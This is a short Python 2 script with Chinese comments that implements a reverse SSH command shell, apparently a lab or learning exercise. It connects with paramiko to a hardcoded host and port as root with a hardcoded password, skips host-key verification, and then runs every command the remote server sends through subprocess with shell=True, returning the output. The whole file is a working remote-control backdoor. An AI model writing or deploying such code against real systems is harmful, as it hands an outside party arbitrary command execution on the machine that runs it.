 #-*-coding:utf-8-*-
import threading
import paramiko
import subprocess

#方法函数ssh_command
def ssh_command(ip,user,passwd,command):
    
    #host_key = paramiko.RSAKey.from_private_key_file(filename='test_rsa.key')
    
    #创建一个SSH客户端对象
    client = paramiko.SSHClient()
    #以传统用户密码验证，还有一种可以用SSH密钥认证
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #client.load_host_keys(filename='test_rsa2.key')
    
    #开始连接
    client.connect(hostname=ip, port=1112,username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024)
        while True:
            #从SSH服务器获取CMD命令
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command,shell=True)
                ssh_session.send(cmd_output)
                
            except Exception as e:
                ssh_session.send(str(e))
        ssh_session.close
    return
    
ssh_command('192.168.2.249','root','password','Client Connect success')